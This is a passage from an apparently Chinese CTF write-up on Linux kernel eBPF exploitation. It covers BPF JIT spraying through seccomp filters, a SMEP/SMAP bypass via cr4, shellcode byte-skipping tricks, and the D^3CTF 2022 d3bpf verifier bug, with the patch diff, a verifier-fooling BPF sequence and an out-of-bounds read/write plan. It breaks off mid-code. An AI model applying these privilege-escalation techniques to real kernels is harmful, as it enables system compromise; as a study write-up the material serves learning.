<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 尝试调用 bpf 系统调用
</span></span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">syscall</span><span class="p">(</span><span class="mi">321</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// 321 是 x64 下 bpf 的调用号
</span></span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">errno</span> <span class="o">==</span> <span class="n">ENOSYS</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;内核不支持该系统调用 (ENOSYS)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;内核支持该系统调用，返回值为: %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/ $ ./exp
</span></span><span class="line"><span class="cl">内核不支持该系统调用 <span class="o">(</span>ENOSYS<span class="o">)</span></span></span></code></pre></td></tr></table></div>
</div>
</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/ # cat /proc/sys/net/core/bpf_jit_enable
</span></span><span class="line"><span class="cl">1</span></span></code></pre></td></tr></table></div>
</div>
</div><p>来自AI：</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">如果是：
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2 → 致盲开启，老套路基本死
</span></span><span class="line"><span class="cl">1 → 还能打
</span></span><span class="line"><span class="cl">0 → 先想办法打开 JIT</span></span></code></pre></td></tr></table></div>
</div>
</div><p>没开致盲</p>
<p>但是，平时我们自定义的沙箱规则其实就是一段bpf程序，它会被写入内核空间中。</p>
<p>所以，思路就是使用<code>prctl</code>写入一段bpf程序到内核中，调用<code>seccon</code>系统调用，控制<code>rip</code>执行这段我们自定义的程序来提权</p>
<ul>
<li>程序怎么写？</li>
<li>怎么执行到这段程序？</li>
</ul>
<h5 class="heading-element" id="编写shellcode"><span>编写shellcode</span>
  <a href="#%e7%bc%96%e5%86%99shellcode" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><ul>
<li>开了<code>smep</code>、<code>smap</code>保护，需要写<code>cr4</code>寄存器为<code>0x6f0</code>来绕过</li>
<li>开了<code>kpti</code>，通过执行<code>swapgs_restore_regs_and_return_to_usermode</code>，切换页表后返回用户态提权</li>
</ul>
<p>写入的指令需要是<code>ebpf</code>格式，经过<code>jit</code>编译后，是x86指令</p>
<p>这里两篇参考文章构造的<code>ebpf</code>指令格式都是，<code>p32(0)+p32(A)</code>，经过<code>jit</code>编译后他会变成<code>0xb8+p32(A)</code>存入内存中</p>
<blockquote>
<p>这里的<code>ebpf</code>指令的<code>opcode</code>被设置为0，其实是设置成了<code>BPF_LD | BPF_IMM | BPF_W</code>，也就是<code>ldw</code></p>
</blockquote>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/32b 0xffffffffc00005d0
</span></span><span class="line"><span class="cl">0xffffffffc00005d0:     0x48    0x89    0xc7    0x04    0xb8    0x58    0x90    0xeb
</span></span><span class="line"><span class="cl">0xffffffffc00005d8:     0x01    0xb8    0xff    0xd0    0xeb    0x01    0xb8    0x58
</span></span><span class="line"><span class="cl">0xffffffffc00005e0:     0x90    0xeb    0x01    0xb8    0xff    0xe0    0xeb    0x01
</span></span><span class="line"><span class="cl">0xffffffffc00005e8:     0xb8    0x90    0x90    0xeb    0x01    0xb8    0x90    0x90</span></span></code></pre></td></tr></table></div>
</div>
</div><p>每两个A直接间隔一个<code>0xb8</code>，跳过<code>0xb8</code>的思路有两种：</p>
<ul>
<li>
<p>写A中的一个字节为<code>0x3c</code>和<code>0xb8</code>组成 <code>cmp al, 0xb8</code>：</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    内存            x86
</span></span><span class="line"><span class="cl">0xb0 0x12       mov al, 0x12
</span></span><span class="line"><span class="cl">0x90            nop
</span></span><span class="line"><span class="cl">0x3c 0xb8       cmp al, 0xb8    ;用0x3c吃掉一个0xb8
</span></span><span class="line"><span class="cl">0xb4 0x34       mov ah, 0x34
</span></span><span class="line"><span class="cl">0x90            nop
</span></span><span class="line"><span class="cl">0x3c ...        ...            ;继续吃掉下一个0xb8</span></span></code></pre></td></tr></table></div>
</div>
</div></li>
<li>
<p>写A中的两个字节为<code>0xeb 0x01</code>（PC = PC+1），来跳过<code>0xb8</code></p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    内存            x86
</span></span><span class="line"><span class="cl">0xb0 0x12        mov al, 0x12  
</span></span><span class="line"><span class="cl">0xeb 0x01        jmp $+3            ;直接过0xb8, 进入mov ah, 0x34, 效果等价于PC = PC+1
</span></span><span class="line"><span class="cl">0xb8
</span></span><span class="line"><span class="cl">0xb4 0x34        mov ah, 0x34
</span></span><span class="line"><span class="cl">0xeb 0x01        jmp $+3
</span></span><span class="line"><span class="cl">...</span></span></code></pre></td></tr></table></div>
</div>
</div></li>
</ul>
<p>参考文章1用的是思路1(但是打不通，不知道为什么)，参考文章2用的是思路2</p>
<h4 class="heading-element" id="d3ctf-2022__d3bpf"><span>D^3CTF 2022__d3bpf</span>
  <a href="#d3ctf-2022__d3bpf" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><blockquote>
<p>内核ebpf</p>
</blockquote>
<p>这里的<code>bzImage</code>可以直接用<code>vmlinux-to-elf</code>提取</p>
<p><code>patch</code>后，如果对一个寄存器右移的位数大于<code>insn_bitness</code>（ALU32运算为32，ALU64为64），则<code>verifier</code>认为该寄存器全部<code>bit</code>已知（补充：指针不可以与标记为<code>unknown</code>的寄存器进行ALU运算），且<code>verifier</code>认为其值为0</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-diff"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
</span></span></span><span class="line"><span class="cl"><span class="gh">index 37581919e..8e98d4af5 100644
</span></span></span><span class="line"><span class="cl"><span class="gd">--- a/kernel/bpf/verifier.c
</span></span></span><span class="line"><span class="cl"><span class="gi">+++ b/kernel/bpf/verifier.c
</span></span></span><span class="line"><span class="cl"><span class="gu">@@ -6455,11 +6455,11 @@ static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
</span></span></span><span class="line"><span class="cl"> 			scalar_min_max_lsh(dst_reg, &amp;src_reg);
</span></span><span class="line"><span class="cl"> 		break;
</span></span><span class="line"><span class="cl"> 	case BPF_RSH:
</span></span><span class="line"><span class="cl"><span class="gd">-		if (umax_val &gt;= insn_bitness) {
</span></span></span><span class="line"><span class="cl"><span class="gd">-			/* Shifts greater than 31 or 63 are undefined.
</span></span></span><span class="line"><span class="cl"><span class="gd">-			 * This includes shifts by a negative number.
</span></span></span><span class="line"><span class="cl"><span class="gd">-			 */
</span></span></span><span class="line"><span class="cl"><span class="gd">-			mark_reg_unknown(env, regs, insn-&gt;dst_reg);
</span></span></span><span class="line"><span class="cl"><span class="gi">+		if (umin_val &gt;= insn_bitness) {
</span></span></span><span class="line"><span class="cl"><span class="gi">+			if (alu32)
</span></span></span><span class="line"><span class="cl"><span class="gi">+				__mark_reg32_known(dst_reg, 0);
</span></span></span><span class="line"><span class="cl"><span class="gi">+			else
</span></span></span><span class="line"><span class="cl"><span class="gi">+				__mark_reg_known_zero(dst_reg);
</span></span></span><span class="line"><span class="cl"> 			break;
</span></span><span class="line"><span class="cl"> 		}
</span></span><span class="line"><span class="cl"> 		if (alu32)
</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>把这个<code>patch</code>翻译一下：</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_0</span><span class="p">,</span> <span class="mh">0x1337</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="nf">BPF_MOV64_IMM</span><span class="p">(</span><span class="n">BPF_REG_1</span><span class="p">,</span> <span class="mi">64</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="nf">BPF_ALU64_REG</span><span class="p">(</span><span class="n">BPF_RSH</span><span class="p">,</span> <span class="n">BPF_REG_0</span><span class="p">,</span> <span class="n">BPF_REG_1</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="nf">BPF_EXIT_INSN</span><span class="p">()</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>那么，<code>verifier</code>就会认为这个<code>reg0</code>为已知（known）的寄存器，且其值确定为0。但是由于CPU进行右移运算的时候，会把右移位数<code>&amp;63</code>，所以实际上CPU执行的运算是<code>0x1337 &gt;&gt; 0</code>。</p>
<p>这里就伪造了一个绕过<code>verifier</code>检查的标量寄存器，我们利用这个标量寄存器和一些指针寄存器进行ALU运算，就造成了越界读写</p>
<h5 class="heading-element" id="任意地址读写"><span>任意地址读写</span>
  <a href="#%e4%bb%bb%e6%84%8f%e5%9c%b0%e5%9d%80%e8%af%bb%e5%86%99" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><p>写入<code>array_map_update_elem </code>、<code>ARRAY_MAP_LOOKUP_ELEM</code>、<code>array_of_map_gen_lookup</code>、<code>array_map_free</code></p>
<p><code>array_of_map_gen_lookup</code></p>
<p>有个<code>map</code>类型是<code>BPF_MAP_TYPE_ARRAY_OF_MAPS</code>，它是一个存储<code>map</code>的数组，它的<code>lookup_elem</code>函数会解引用两次</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">array_of_map_lookup_elem</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">map</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">**</span><span class="n">inner_map</span> <span class="o">=</span> <span class="nf">array_map_lookup_elem</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">inner_map</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nf">READ_ONCE</span><span class="p">(</span><span class="o">*</span><span class="n">inner_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>把<code>map_lookup_elem</code>改成<code>array_of_map_gen_lookup</code>后，使用 <code>lookup_element</code>时<code>verifier</code>会认为它返回了一个指向<code>map_value</code>的指针，但是实际上返回的东西是用户可以控制的，因为他会再次解引用用户传入的东西</p>
<h5 class="heading-element" id="思路流程"><span>思路流程</span>
  <a href="#%e6%80%9d%e8%b7%af%e6%b5%81%e7%a8%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><ul>
<li>先初始化<code>stack-4</code></li>
<li>保存r1中存的<code>ctx</code>到r6，后续需要使用到<code>ctx</code>就会到r6中找</li>
<li>调用辅助函数<code>BPF_FUNC_map_lookup_elem</code>，第一个参数为执行<code>map</code>的指针，第二个参数为<code>key</code>，值为0。返回值存在r0，为一个指向<code>value</code>域的地址（<code>struct bpf_array</code>）</li>
<li>调用完辅助函数后，<code>verifier</code>认为r0中的值的类型为<code>PTR_TO_MAP_VALUE_OR_NULL</code>，要对他进行非0验证，让他收敛（refine）成<code>PTR_TO_MAP_VALUE</code>才能进行解引用或者其他一些操作</li>
<li>构造一个绕过<code>verifier</code>检测的寄存器，让他指向<code>value - 0x110</code>这个地方，也就是虚表指针</li>
<li>把他写回<code>value</code>域，泄露出来</li>
</ul>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
